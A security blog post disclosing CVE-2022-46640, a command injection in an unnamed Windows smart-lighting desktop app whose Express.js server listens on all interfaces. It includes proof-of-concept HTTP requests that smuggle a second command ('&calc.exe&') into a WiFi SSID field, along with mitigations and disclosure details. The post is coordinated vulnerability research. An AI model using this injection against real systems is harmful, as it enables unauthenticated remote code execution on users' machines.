<!DOCTYPE html>
<html lang="en" class="dark-mode">
<head>

    <title>How I hacked IoT management apps: the story behind CVE-2022-46640</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=ed47c1e075" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=ed47c1e075" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=ed47c1e075" />

    <link rel="icon" href="https://pwning.tech/content/images/size/w256h256/format/png/2024/02/favicon.webp" type="image/png">
    <link rel="canonical" href="https://pwning.tech/cve-2022-46640/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Pwning Tech">
    <meta property="og:type" content="article">
    <meta property="og:title" content="How I hacked IoT management apps: the story behind CVE-2022-46640">
    <meta property="og:description" content="Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost,">
    <meta property="og:url" content="https://pwning.tech/cve-2022-46640/">
    <meta property="og:image" content="https://pwning.tech/content/images/2024/01/publication-cover-casper-1k.webp">
    <meta property="article:published_time" content="2023-03-08T07:30:00.000Z">
    <meta property="article:modified_time" content="2023-03-13T12:52:39.000Z">
    <meta property="article:tag" content="Web Exploitation">
    <meta property="article:tag" content="Real World">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="How I hacked IoT management apps: the story behind CVE-2022-46640">
    <meta name="twitter:description" content="Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost,">
    <meta name="twitter:url" content="https://pwning.tech/cve-2022-46640/">
    <meta name="twitter:image" content="https://pwning.tech/content/images/2023/12/logo_twitter_card.webp">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="notselwyn">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Web Exploitation, Real World">
    <meta name="twitter:site" content="@notselwyn">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="482">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Pwning Tech",
        "url": "https://pwning.tech/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://pwning.tech/content/images/2024/02/frontpage_logo-6.svg"
        }
    },
    "author": {
        "@type": "Person",
        "name": "notselwyn",
        "url": "https://pwning.tech/author/notselwyn-2/",
        "sameAs": []
    },
    "headline": "How I hacked IoT management apps: the story behind CVE-2022-46640",
    "url": "https://pwning.tech/cve-2022-46640/",
    "datePublished": "2023-03-08T07:30:00.000Z",
    "dateModified": "2023-03-13T12:52:39.000Z",
    "keywords": "Web Exploitation, Real World",
    "description": "Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost, we&#x27;re going to share our experience hacking into a desktop app with a very large number of downloads, and explain how we were able to do it. Whether you",
    "mainEntityOfPage": "https://pwning.tech/cve-2022-46640/"
}
    </script>

    <meta name="generator" content="Ghost 5.75">
    <link rel="alternate" type="application/rss+xml" title="Pwning Tech" href="https://pwning.tech/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="edf92d97a2ffbb07659fa25625" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://pwning.tech/" crossorigin="anonymous"></script>
    
    <link href="https://pwning.tech/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=ed47c1e075"></script>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=ed47c1e075">
    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.css" integrity="sha512-Dqf5696xtofgH089BgZJo2lSWTvev4GFo+gA2o4GullFY65rzQVQLQVlzLvYwTo0Bb2Gpb6IqwxYWtoMonfdhQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism-themes/1.9.0/prism-vsc-dark-plus.min.css" integrity="sha512-ML8rkwYTFNcblPFx+VLgFIT2boa6f8DDP6p6go4+FT0/mJ8DCbCgi6S0UdjtzB3hKCr1zhU+YVB0AHhIloZP8Q==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/brands.min.css" integrity="sha512-W/zrbCncQnky/EzL+/AYwTtosvrM+YG/V6piQLSe2HuKS6cmbw89kjYkp3tWFn1dkWV7L1ruvJyKbLz73Vlgfg==" crossorigin="anonymous" referrerpolicy="no-referrer" />

<!-- line numbers
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" integrity="sha512-cbQXwDFK7lj2Fqfkuxbo5iD1dSbLlJGXGpfTDqbggqjHJeyzx88I3rfwjS38WJag/ihH7lzuGlGHpDBymLirZQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
-->

<style>
    .gh-head-menu .nav-twitter a,
    .gh-head-menu .nav-github a {
        font-size: 0 !important;
    }

    .gh-head-menu .nav-twitter a::before,
    .gh-head-menu .nav-github a::before {
        font-family: "Font Awesome 6 Brands";
        display: inline-block;
        font-size: 20px;
        font-style: normal;
        font-weight: normal;
        font-variant: normal;
        text-rendering: auto;
        font-smoothing: antialiased;
    }

    .gh-head-menu .nav-twitter a::before {content: "\f099"}
    .gh-head-menu .nav-github a::before {content: "\f09b"}
</style>

<!-- Tocbot Stylesheet -->
<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.25.0/tocbot.min.css" integrity="sha512-4q0OX9NAYcRTFEfy9nTK0AV9N7MxM665neDXEW3CjAj1pXc6+8Bcd6ryXl6cY8mTBBXt0aXepnSDLLQZSuJRww==" crossorigin="anonymous" referrerpolicy="no-referrer" />

<!-- Tocbot Inline CSS (Specific Adjustments for the Casper Theme) -->
<style>
   
.gh-content {
    position: relative;
 }

.gh-toc > .toc-list {
    position: relative;
    overflow: hidden;
    padding-left: 10px;
}
    
.toc-list-item a {
    text-decoration: none;
}
    
.toc-list-item {  
    list-style: none !important;
}
    
.toc-list {    
    margin-left: 20px;
}

@media (min-width: 1300px) {
     .gh-sidebar {
        position: absolute; 
        top: 0;
        bottom: 0;
        margin-top: 4vmin;
		margin-left: 20px;
        grid-column: 1 / 3;
    }
   
    .gh-toc {
        position: sticky;
        top: 4vmin;
    }
    
    /* compensate ToC margin (required for scrolling) */
    .article-header {
     	padding-bottom: 10px;   
    }
}

.gh-toc .is-active-link::before {
    background-color: var(--ghost-accent-color);
}
</style>

<style>
	/* fix cover image of blogpost (make it inline with the text) */
	.gh-canvas .article-image {
     	grid-column: 3/3;   
    }
</style>

<style>
  /* set font of entire website */
  body { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:400,600), sans-serif; }
  h1 h2 h3 h4 h5 h6 { font-family: @import url(https://fonts.bunny.net/css?family=noto-sans:600), sans-serif; }
</style>

<style>
  /* set codeblock background color to vscode */
  html.dark-mode .gh-content code { background-color: #1e1e1e }
  html.dark-mode .gh-content pre { background-color: #1e1e1e }

  /* set thirtiary colors, for accessibility not to -22% */
  html.dark-mode :is(.post-card-tags, .post-card-meta, .article-tag a, .byline-meta-content, .pagination .page-number) {
    color: var(--color-secondary-text);
  }
</style><style>:root {--ghost-accent-color: #e01b24;}</style>

</head>
<body class="post-template tag-web tag-real-world tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 is-head-left-logo has-sans-body has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo" href="https://pwning.tech">
                        <img src="https://pwning.tech/content/images/2024/02/frontpage_logo-6.svg" alt="Pwning Tech">
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://pwning.tech/">Home</a></li>
    <li class="nav-infrastructure"><a href="https://pwning.tech/infra/">Infrastructure</a></li>
    <li class="nav-about"><a href="https://pwning.tech/about/">About</a></li>
    <li class="nav-twitter"><a href="https://twitter.com/notselwyn/">Twitter</a></li>
    <li class="nav-github"><a href="https://github.com/notselwyn/">Github</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-web tag-real-world tag-hash-import-2023-09-17-13-10 tag-hash-import-2023-12-29-22-15 no-image ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/web/">Web Exploitation</a>
                </span>
        </div>

        <h1 class="article-title">How I hacked IoT management apps: the story behind CVE-2022-46640</h1>


        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list">
                <li class="author-list-item">
                    <a href="/author/notselwyn-2/" class="author-avatar author-profile-image"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
</a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/notselwyn-2/">notselwyn</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2023-03-08">Mar 8, 2023</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 8 min read</span>
                </div>
            </div>

        </section>
        </div>


    </header>

    <section class="gh-content gh-canvas">
        <p>Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost, we're going to share our experience hacking into a desktop app with a very large number of downloads, and explain how we were able to do it. Whether you're a developer, a security researcher, or just someone curious about software security, you won't want to miss this interesting write-up. So, let's dive in!</p><h2 id="content">Content</h2><ol><li>Introduction to IoT desktop apps</li><li>Proof of Concept exploit</li><li>Analyzing the IoT desktop app</li><li>Creating a Proof of Concept exploit</li><li>Conclusion</li></ol><h2 id="introduction-to-iot-desktop-apps">Introduction to IoT desktop apps</h2><p>Smart lighting has evolved beyond just mobile apps. With the rise of desktop apps, managing smart lights has become even more convenient. Desktop apps for smart lighting allow users to manage their smart lights from their computers, with some apps offering unique features like a more user-friendly interface or advanced automation options.</p><p>Desktop apps for smart lighting can pose security risks, including potential vulnerabilities that hackers could exploit to <a href="https://pwning.tech/cve-2022-47758">gain access to a user's smart lights</a> and even the desktop itself... To minimize these risks, users should download apps from trusted sources, and especially update apps and operating systems regularly. Additionally users can separate IoT networks from normal networks.</p><p>The desktop app we managed to exploit was written in Electron with an back-end server written in Express.js. The back-end Express.js server was accessible from any device which meant that remote exploitation was possible.  </p><h2 id="proof-of-concept-exploit">Proof of Concept exploit</h2><p>In order to exploit the command injection vulnerability (which leads to unauthenticated RCE) we can send a mere HTTP request as Proof of Concept (PoC). The root cause is a command injection vulnerability in an unauthenticated Express.js API endpoint on the device that changes the active WiFi network. This "intended" WiFi reconfiguration functionality itself is an RWR vulnerability because an attacker can set up their own malicious WiFi network and make the target device connect to it to eavesdrop it.</p><p>The code that causes this command injection vulnerability is located in the Windows WiFi network subsystem of the application. We can supply a malicious access point SSID in the HTTP request which allows us to inject our own commands into <code>execCommand()</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-js">function connect(ap) { 
    console.log("using windows wifi handler");
    return scan().then((networks) =&gt; { ...
    }).then(() =&gt; {
        return execCommand('netsh wlan add profile filename="nodeWifiConnect.xml"');
    }).then(() =&gt; {
        return execCommand(`netsh wlan connect ssid="${ap.name}" name="${ap.name}"`);
    }).then(() =&gt; { ...
    }).catch((err) =&gt; {
        console.warn("windowsWifi connectToWifi Error:", err);
        return execCommand(`netsh wlan delete profile "${ap.name}"`).then(() =&gt; {
            return Promise.reject(err);
        });
    });
}</code></pre><figcaption><code>connect(ap)</code> - the code that contains the command injection vulnerability</figcaption></figure><p>The payload in the malicious HTTP request is a JSON body including the new WiFi SSID and the new WiFi password. We can supply an SSID that escapes the command <code>netsh wlan delete profile "${ap.name}"</code> to exploit it. An example of such SSID is <code>{"name": "\"&amp;calc.exe&amp;::"}</code> - in which <code>&amp;</code> is used to background the command and <code>::</code> to comment out everything that follows.</p><figure class="kg-card kg-code-card"><pre><code class="language-http">POST /validateWifiPassword HTTP/1.1
Host: target.local:56751
Content-Length: 75
Content-Type: application/json

{"new_network":{"name":"attacker_ssid","password":"attacker_pass"}}</code></pre><figcaption>HTTP request for the typical credential check</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-http">POST /validateWifiPassword HTTP/1.1
Host: target.local:56751
Content-Length: 75
Content-Type: application/json

{"new_network":{"name":"\"&amp;calc.exe&amp;::","password":"attacker_pass"}}</code></pre><figcaption>HTTP request containing our own payload which executes calc.exe</figcaption></figure><p>This proof of concept payload spawns the Windows calculator on the desktop of the vulnerable target device. According to our research it is possible to make a fully fletched shell that can upload files, download files, and execute commands all while using native vulnerabilities we found in the app. Those vulnerabilities like LFI, LFW, et cetera have been patched by the vendor due to our research as well.</p><h2 id="analyzing-the-iot-desktop-app">Analyzing the IoT desktop app</h2><p>In order to find vulnerabilities in the desktop app, we need to get our hands on the code. To find the relevant code, I tried searching in the app directory for strings that get shown when running the app. If the app was a compiled PE executable we should still get results. Using <code>grep -iRe "Sign In"</code> we can find the file <code>app.asar</code>. An ASAR file turns out to be a source code package for an Electron app. We found the <a href="https://github.com/electron/asar">asar</a> tool developed by Electron themselves and used it to extract the source code from the ASAR file using <code>asar e app.asar out</code>. </p><p>The first thing we researched when we got access to the source code was finding the entrypoint of the application. Since the project structure looked an aweful lot like an Express.js webserver, we started looking for the initialization of the webserver to find the host, port and routes. It turns out that the ports are provided in an environment and that the app listens to port 56751 and binds to 0.0.0.0 (due to its lack of providing an interface). </p><p>The fact that the server binds to 0.0.0.0 is the root cause of all vulnerabilities listed in this blogpost. Because the interface doesn't bind to just localhost (a.k.a. 127.0.0.1), any device on the network can connect to the webserver. This is fundamentally not necessary in this usecase and it's making exploitation possible from other devices. If the server binded to 127.0.0.1 instead, there wouldn't be RCE since remote devices would be able to communicate with the webserver. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">  production: {
    env: 'production',
    root: rootPath,
    app: {
      name: 'device-monitor-server'
    },
    port: 56751,
    redis: {
        host: process.env.REDIS_ADDRESS,
        port: 6379
    }
  }</code></pre><figcaption><code>config/config.js</code> - containing information about the environment</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-js">
global.App = {
    app: app,
    env: env,
    server: http.createServer(app),
    config: require('./config/config'),
    port: require('./config/config').port,
    // ...
    start: function() {
        if (!this.started) {
            // ...
            this.server.listen(this.port)
            console.log("Operating System :", process.platform);
            console.log("Running App Version " + App.version + " on port " + App.port + " in " + App.env + " mode")
        }
    }
}
</code></pre><figcaption><code>application.js</code> <code>-</code> binding to <code>0.0.0.0:56751</code></figcaption></figure><p>Since we found out that the webserver binds to 0.0.0.0:56751, we can now start looking for API routes, since the Electron app uses those to manage the smart lights. After running a few grep queries for "routes", we found <code>config/routes.js</code>. This file contains more than 60 API routes from actions like managing the smart devices to changing WiFi settings on the host. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">// ...

app.get('/network/info', EncryptionController.getCurrentNetworkInfo);
app.post('/network/reconnect', EncryptionController.reconnectToNetwork);
app.get('/wides', EncryptionController.getWifis);

app.post('/validateWifiPassword', EncryptionController.validateWifiPassword);

app.post('/wac/device', dnssdController.enableWACMode, EncryptionController.connectDeviceToNetwork, dnssdController.disableWACMode, dnssdController.getDevices);

// ...</code></pre><figcaption><code>config/routes.js</code> - containing the routes of the app</figcaption></figure><p>We analysed nearly all 60 endpoints and found plenty of vulnerabilities - all of which can be exploited remotely because the server binds to <code>0.0.0.0</code>. We started analysing the endpoints with a priority on dangerous endpoints - the endpoints which call command execution functions. We searched for those using <code>grep -iRe "execCommand"</code>, which only gave <code>app/utils/windowsWifi.js</code> back. Analysing this file gave the following dangerous functions:</p><figure class="kg-card kg-code-card"><pre><code class="language-js">function execCommand(cmd) {
    return new Promise((resolve, reject) =&gt; {
        exec(cmd, env, (err, stdout, stderr) =&gt; { /* ... */ });
    });
}</code></pre><figcaption><code>execCommand</code> - the primary dangerous function being used</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-js">function connect(ap) { 
    console.log("using windows wifi handler");
    return scan().then((networks) =&gt; { // ... 
    }).then(() =&gt; { // ...
    }).then(() =&gt; {
        return execCommand(`netsh wlan connect ssid="${ap.name}" name="${ap.name}"`);
    }).then(() =&gt; { // ...
    }).catch((err) =&gt; {
        console.warn("windowsWifi connectToWifi Error:", err);
        return execCommand(`netsh wlan delete profile "${ap.name}"`).then(() =&gt; { // ...
        });
    });
}</code></pre><figcaption><code>connect(ap)</code> - dangerous function containing</figcaption></figure><p>The function <code>connect(ap)</code> sticks out because it executes a command with user input injected into the command. If we could set <code>ap.name</code> to <code>"&amp; calc&amp;</code>, we should be able to start <code>calc.exe</code> on the management desktop. In order to check whether or not we could control <code>ap.name</code> from a webrequest, we ran another grep query for <code>connect</code> and got results. </p><p>We found <code>validateWifiPassword(req, res)</code> which is a callback for <code>app.post('/validateWifiPassword', ...)</code>. This function calls <code>platformWifi.connect</code>, in which <code>platformWifi</code> is a class dependent on the OS of the host. If it is Windows, it calls the vulnerable <code>connect(ap)</code> function above - otherwise it will use a secure version. This means that only Windows is vulnerable. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">let platformWifi;

if (process.platform === 'win32') {
    // node-wifi does not work well for some operations on Windows, so import our own library for them
    platformWifi = require('../utils/windowsWifi');
} else {
    platformWifi = wifi;
}</code></pre><figcaption><code>platformWifi</code> - the selected WiFi library</figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-js">function validateWifiPassword(req, res) {
    const new_network = req.body.new_network;
    if (!new_network.name || !new_network.password) {
        // ...
    }
    console.log(`Checking wifi creds for ${new_network.name}...`);

    const callback = (err) =&gt; {
        // ...
    };

    let accessPoint = { name: new_network.name, password: new_network.password };
    platformWifi.connect(accessPoint, callback);
}</code></pre><figcaption><code>validateWifiPassword()</code> - the API callback function</figcaption></figure><p>The <code>validateWifiPassword()</code> function requests the parameter <code>new_network</code> with subparameters <code>name</code> and <code>password</code>. These are passed directly into <code>platformWifi.connect(accessPoint, callback)</code>, which means that there's a command injection vulnerability since we can supply an arbitrary SSID into the command <code>netsh wlan connect ssid="${ap.name}"</code>.</p><h2 id="creating-a-proof-of-concept-exploit">Creating a Proof of Concept exploit</h2><p>We have vision on our exploitable primitives: command injection through an HTTP request sent to the API endpoint <code>POST /validateWifiPassword</code> hosted on a webserver that binds to 0.0.0.0:56751. Let's go through it from start to finish.</p><p>We're starting the exploit by sending a request to the following Express.js API endpoint that binds to 0.0.0.0:56751. The API endpoint triggers a call to <code>EncryptionController.validateWifiPassword()</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-js">app.post('/validateWifiPassword', EncryptionController.validateWifiPassword);
</code></pre><figcaption>The API endpoint registration including its callback function</figcaption></figure><p>The <code>validateWifiPassword()</code> function is a wrapper for sanitizing the user input and handling request output. The user input is expected in the HTTP body and is expected to have the form of <code>new_network.name</code> (for the WiFi SSID) and <code>new_network.password</code> (for the WiFi password). The easiest way to do this is using a JSON structure like <code>{"new_network":{"name":"ABC","password":"XYZ"}}</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-js">function validateWifiPassword(req, res) {
    const new_network = req.body.new_network;
    if (!new_network.name || !new_network.password) {
        console.error("Invalid request object.");
        return res.sendStatus(422);
    }
    console.log(`Checking wifi creds for ${new_network.name}...`);

    const callback = (err) =&gt; {
        if (err) {
            // ...
        }
        console.log("Successfully connected  to", new_network.name);
        return res.sendStatus(204);
    };

    let accessPoint = { name: new_network.name, password: new_network.password };
    platformWifi.connect(accessPoint, callback);
}
</code></pre><figcaption><code>validateWifiPassword()</code> - the IO wrapper around <code>wifi.connect()</code></figcaption></figure><p>Next, the function <code>windowsWifi.connect()</code> gets called. This function calls the dangerous <code>execCommand</code> function plenty of times using user controllable input. Specifically, <code>new_network.name</code> gets used for the command injection. This means that we have to inject a payload as <code>new_network.name</code> to achieve RCE on the webserver.</p><figure class="kg-card kg-code-card"><pre><code class="language-js">function connect(ap) { 
    console.log("using windows wifi handler");
    return scan().then((networks) =&gt; { ...
    }).then(() =&gt; {
        return execCommand('netsh wlan add profile filename="nodeWifiConnect.xml"');
    }).then(() =&gt; {
        return execCommand(`netsh wlan connect ssid="${ap.name}" name="${ap.name}"`);
    }).then(() =&gt; { ...
    }).catch((err) =&gt; {
        console.warn("windowsWifi connectToWifi Error:", err);
        return execCommand(`netsh wlan delete profile "${ap.name}"`).then(() =&gt; {
            return Promise.reject(err);
        });
    });
}</code></pre><figcaption><code>connect()</code> - the function containing vulnerable code</figcaption></figure><p>We're dealing with the command <code>netsh wlan connect ssid="${ap.name}" name="${ap.name}"</code> and we can control <code>${ap.name}</code>. We want to execute the Windows calculator (calc.exe) to get a graphical proof of concept on the vulnerable device. To do this, we need to escape the quotes of the command and ignore the rest of the command. This would look something like <code>netsh wlan connect ssid=""&amp;calc.exe&amp;::" name=""&amp;calc.exe&amp;::"</code>where only <code>netsh wlan connect ssid=""&amp; calc.exe&amp;</code> gets executed since <code>::</code> makes the rest of the line a comment. We use &amp; to background the task, so <code>netsh wlan connect ssid=""</code> can fail in the background whilst <code>calc.exe</code> can succeed in the background. This means that we need to make our SSID <code>"&amp;calc.exe&amp;::</code>. The entire HTTP request would become as follows. </p><figure class="kg-card kg-code-card"><pre><code class="language-http">POST /validateWifiPassword HTTP/1.1
Host: target.local:56751
content-type: application/json
Content-Length: 61

{"new_network":{"name":"\"&amp;calc.exe&amp;::","password":"xyz"}}</code></pre><figcaption>The PoC payload executing <code>calc.exe</code> on the target device</figcaption></figure><h2 id="conclusion">Conclusion</h2><p>In conclusion, we exploited a command injection vulnerability by sending an HTTP request to a remote vulnerable Express.js API webserver that binds to all interfaces. Our internal research concluded that it's possible to make a fully fletched shell using vulnerabilities in this app, that could upload/download files and execute commands which would make it ideal for attackers. </p><p>The mitigations for these vulnerabilities would be as follows: only bind to interfaces that need access (in this case 127.0.0.1) to prevent remote access all together; sanitize controllable user input (especially when executing commands); disable remote wireless reconfiguration all together to prevent MitM attacks; disable arbitrary file operations (c.q. reading and writing) as it will only introduce vulnerabilities. </p><p>Going forward, we recommend users to keep their software up-to-date as vendors continuously release patches for vulnerabilities like those shown in this blogpost. Additionally we recommend more advanced users to use firewalls on their devices, which should deny incoming traffic by default as it can prevent lots of vulnerabilities. </p><p>Furthermore, the vulnerabilities in said desktop app were patched by the vendor in December 2022, a month after coordinated vulnerability disclosure (CVD). The vendor gave us explicit permission to publish this blogpost (under the agreement we wouldn't mention the vendors name nor desktop app name) and to publish <code>CVE-2022-46640</code>. </p><p></p><p>We hope you learned reading this blogpost as much as we did researching the vulnerabilities, and thank you for taking the time to read this blogpost.</p><p>Notselwyn, March 2023</p>
    </section>


</article>
</main>




            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd-syzkaller/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Tickling ksmbd: fuzzing SMB in the Linux kernel
                </h2>
            </header>
                <div class="post-card-excerpt">Following the adventure of manually discovering network-based vulnerabilities in the Linux kernel, I'm adding ksmbd-fuzzing functionality to the already extensive kernel-fuzzing tool that is Syzkaller.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-09-16">Sep 16, 2023</time>
                <span class="post-card-meta-length">7 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)
                </h2>
            </header>
                <div class="post-card-excerpt">December 22nd 2022: it's Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-08-04">Aug 4, 2023</time>
                <span class="post-card-meta-length">10 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/cve-2022-47758/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    How I hacked smart lights: the story behind CVE-2022-47758
                </h2>
            </header>
                <div class="post-card-excerpt">In this blogpost, we take a closer look at our research regarding CVE-2022-47758: a critical vulnerability impacting a very large number of Internet of Things smart devices. We could leverage this vulnerability in the lamp's firmware for unauthenticated remote code execution on the entire device with the highest privileges and</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-03-08">Mar 8, 2023</time>
                <span class="post-card-meta-length">16 min read</span>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://pwning.tech">Pwning Tech</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

